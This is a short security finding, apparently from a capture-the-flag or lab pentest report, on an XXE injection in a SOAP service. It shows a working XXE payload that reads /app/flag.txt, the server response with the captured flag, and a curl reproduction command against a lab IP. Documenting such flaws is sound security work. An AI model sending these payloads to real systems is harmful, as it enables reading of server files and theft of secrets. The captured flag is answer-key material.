findings.title: XXE Injection in SOAP Service — Arbitrary File Read
findings.description: The /soap_service endpoint parses XML input without disabling external entity processing (XXE). An authenticated attacker can inject a DOCTYPE declaration with a SYSTEM entity referencing local files. The server resolves and returns the file content in the XML response, enabling arbitrary file read on the server.
findings.evidence:
Request:
POST /soap_service HTTP/1.1
Content-Type: application/xml
Cookie: session=eyJ1c2VybmFtZSI6ImpvaG4ifQ...

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>

Response:
<GetAccountInfoResponse>
  <account_id>flag{0abbab82-7e17-488e-8c06-c413564d6d4a}</account_id>
  <balance>1000 USD</balance>
  ...
</GetAccountInfoResponse>

CTF FLAG: flag{0abbab82-7e17-488e-8c06-c413564d6d4a}

reproduction.command: curl -si -b 'session=<john-session>' -X POST http://172.17.0.1:55807/soap_service -H 'Content-Type: application/xml' -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]><GetAccountInfoRequest><account_id>&xxe;</account_id></GetAccountInfoRequest>'
